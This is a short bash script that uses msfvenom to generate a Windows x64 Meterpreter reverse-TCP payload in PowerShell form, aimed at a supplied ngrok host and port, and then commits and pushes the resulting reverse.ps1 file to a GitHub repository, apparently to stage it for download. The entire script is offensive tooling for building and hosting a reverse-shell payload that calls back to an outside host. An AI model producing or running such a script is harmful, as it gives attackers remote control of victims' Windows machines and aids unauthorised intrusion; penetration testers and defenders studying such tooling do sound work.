#!/bin/bash

# Usage: ./generate_payload.sh 5.tcp.eu.ngrok.io:11625

# Check if argument is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <ngrok_address>"
    exit 1
fi

# Extract ngrok host and port
ngrok_address=$1
ngrok_ip=$(echo $ngrok_address | cut -d ':' -f 1)
ngrok_port=$(echo $ngrok_address | cut -d ':' -f 2)

# Define payload directory
payload_dir="$HOME/reverse-shell-test"
payload_file="reverse.ps1"

# Create directory if it doesn't exist
mkdir -p "$payload_dir"

# Generate payload with msfvenom
echo "[*] Generating payload with msfvenom..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$ngrok_ip" LPORT="$ngrok_port" -f psh > "$payload_dir/$payload_file"

# Check if msfvenom was successful
if [ $? -ne 0 ]; then
    echo "[!] Failed to generate payload."
    exit 1
fi

# Navigate to the payload directory
cd "$payload_dir"

echo "[*] Checking GitHub authentication..."
if ! gh auth status >/dev/null 2>&1; then
    echo "[!] GitHub CLI not authenticated. Printing payload instead:"
    cat "$payload_file"
    exit 0
fi

# Add payload to Git, commit, and push
echo "[*] Committing and pushing to GitHub..."
git pull origin main  # Ensure latest changes are pulled
git add "$payload_file"
git commit -m "Add generated reverse shell payload"
git push origin main  # Push changes using stored authentication

# Check if push was successful
if [ $? -eq 0 ]; then
    echo "[*] Payload uploaded successfully to GitHub."
else
    echo "[!] Failed to push to GitHub."
fi
